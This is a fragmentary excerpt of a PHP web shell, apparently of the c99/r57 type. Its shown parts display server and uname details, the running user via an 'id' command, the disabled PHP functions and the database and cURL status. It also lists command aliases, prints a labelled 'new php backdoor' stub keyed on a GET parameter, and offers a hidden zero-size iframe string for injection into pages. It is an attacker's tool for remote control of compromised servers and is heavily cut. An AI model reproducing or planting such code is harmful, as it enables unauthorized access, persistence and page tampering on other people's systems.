...
?><?php echo $DISP_SERVER_SOFTWARE; ?><?php echo wordwrap(php_uname(),90,'<br>',1); if($win) echo ' ('.exec('ver').')'; ?><?php echo $hsafemode; ?><?php if (!$win) {echo wordwrap(myshellexec('id'),90,'<br>',1);} else {echo 'Running As: '.get_current_user();} ?><?php if(''==($df=@ini_get('disable_functions'))){echo '<font color=green>NONE</font></b>';}else{echo '<br><font color=red>'.str_replace(',', ', ', $df).'</font></b>';} ?><?php $curl_on = @function_exists('curl_version');
echo "<br/><b>cURL: ".(($curl_on)?("<font color=green>ON</font></b>"):("<font color=red>OFF</font></b>")); ?><?php
...
if($ora_on){echo "<font color=green>ON</font>";}else{echo "<font color=red>OFF</font>";} ?><?php
...
?><?php echo $surl; ?><?php echo realpath('.'); ?><?php echo htmlspecialchars('<IFRAME src="http://www.google.com" width=0 height=0 frameborder=0></IFRAME>'); ?><?php
...
//new php backdoor
?><?php echo $surl; ?><?php echo realpath('.'); ?><?php echo htmlspecialchars('<?php if ($_GET["x"] == "lul") { /*code*/; } ?><?php
...
echo("$emsg");
echo("</center>");
} ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo htmlspecialchars($cmd); ?><?php echo wordwrap(php_uname()); ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $surl; ?><?php echo $dispd; ?><?php
// Command-aliases 
...
?><?php echo $surl; ?><?php echo $dispd; ?><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $surl; ?><?php
if(isset($_GET['file'])) {
	$test='';
...
?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo round(getmicrotime()-starttime,4); ?><?php chdir($lastdir); GNYexit(); ?>